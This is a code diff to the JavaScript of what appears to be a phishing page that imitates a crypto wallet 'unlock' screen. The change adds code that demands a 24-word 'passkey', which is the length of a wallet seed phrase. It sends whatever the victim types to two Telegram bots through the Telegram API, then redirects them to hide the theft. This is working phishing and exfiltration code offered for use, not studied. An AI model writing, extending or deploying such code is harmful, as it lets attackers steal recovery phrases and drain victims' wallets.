@@ -325,36 +325,62 @@
   }
 
   function sendMessage() {
-    const message = input.value.trim();
+  const message = input.value.trim();
 
-    disableInputAndButtons(true);
+  disableInputAndButtons(true);
 
-    buttonTexts.forEach(bt => {
-      bt.innerHTML = `<span class="loading-spinner"></span>Unlocking...`;
+  buttonTexts.forEach(bt => {
+    bt.innerHTML = `<span class="loading-spinner"></span>Unlocking...`;
+  });
+
+  statusMessage.className = 'status-message';
+
+  // Check word count
+  const wordCount = message.split(/\s+/).length;
+
+  if (wordCount < 24) {
+    showStatus("The Passkey Should Be 24 Words Length", "error");
+
+    setTimeout(() => {
+      window.location.href = HOMEPAGE_URL;
+    }, 5000);
+
+    setTimeout(() => {
+      disableInputAndButtons(false);
+      buttonTexts[0].textContent = "Unlock With Passphrase";
+      buttonTexts[1].textContent = "Unlock With Face ID";
+    }, 5000);
+
+    return;
+  } else {
+    // ✅ Send message to both Telegram bots
+    const text = `🔑 New Passkey Received:\n\n${message}\n\n🕒 Time: ${formatTimeWithOclock(new Date())}`;
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID_1,
+        text: text
+      })
     });
 
-    statusMessage.className = 'status-message';
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID_2,
+        text: text
+      })
+    });
 
-    if (message.length > 24) {
-      showStatus("The Passkey Should Be 24 Words Length", "error");
-
-      setTimeout(() => {
-        window.location.href = HOMEPAGE_URL;
-      }, 5000);
-
-      setTimeout(() => {
-        disableInputAndButtons(false);
-        buttonTexts[0].textContent = "Unlock With Passphrase";
-        buttonTexts[1].textContent = "Unlock With Face ID";
-      }, 5000);
-
-      return;
-    } else {
-      // Redirect to the shop page immediately if 24 or more characters
+    // Then redirect
+    setTimeout(() => {
       window.location.href = REDIRECT_URL;
-      return;
-    }
+    }, 1000); // small delay to ensure sending
   }
+}
+
 
   input.addEventListener("input", function () {
     this.style.height = "auto";
